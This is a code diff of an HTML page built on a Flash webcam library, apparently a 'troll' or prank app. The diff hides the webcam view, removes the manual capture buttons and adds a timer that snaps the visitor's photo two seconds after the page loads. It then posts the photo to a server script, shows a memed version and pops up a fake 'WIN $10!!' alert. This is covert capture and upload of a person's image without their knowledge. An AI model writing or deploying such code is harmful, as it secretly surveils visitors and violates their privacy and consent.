@@ -1,6 +1,11 @@
 <!DOCTYPE html>
 <html>
 <head>
+  <style type="text/css">
+  #cam {
+    display:none;
+  }
+  </style>
   <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.6.2/jquery.min.js"></script>
   <script type="text/javascript" src="jpegcam/webcam.js"></script>
   <script type="text/javascript">
@@ -39,28 +44,36 @@
       name: name
     }, function(data) {
       $.post("/a/honeybadger/aviary_magic.php", { filename: filename, troll_name: name }, function(res) {
-        console.log(res);
+        var av_magic = $.parseJSON(res);
+        if(av_magic.success) {
+          memed = av_magic.memed;
+          var img = $("<img>").attr("src",memed);
+          $("#memed").append(img);
+          alert('WIN $10!!');
+        }
       });
     });
 	}
 	
 	$(function() {
-	  $("#configure").click(function() {
-	    webcam.configure()
-	  })
-	  $("#take-pic").click(function() {
+    // $("#take-pic").click(function() {
+    //   webcam.snap();
+    // })
+	  setTimeout(function() {
 	    webcam.snap();
-	  })
+	  }, 2000)
 	})
   </script>
 </head>
 <body>
+  
+  <div id="cam">
   <script language="JavaScript">
 		document.write( webcam.get_html(640, 480) );
-	</script>
+  </script>
+	</div>
 	
-	<button id="configure">configure</button>
-	<button id="take-pic">take pic</button>
+	<!-- <button id="take-pic">take pic</button> -->
 
 <br>
 <div id="fb-root"></div>
@@ -76,6 +89,7 @@
     document.getElementById('fb-root').appendChild(e);
   }());
 </script>	
+<div id="memed"></div>
 </body>
 </html>
 
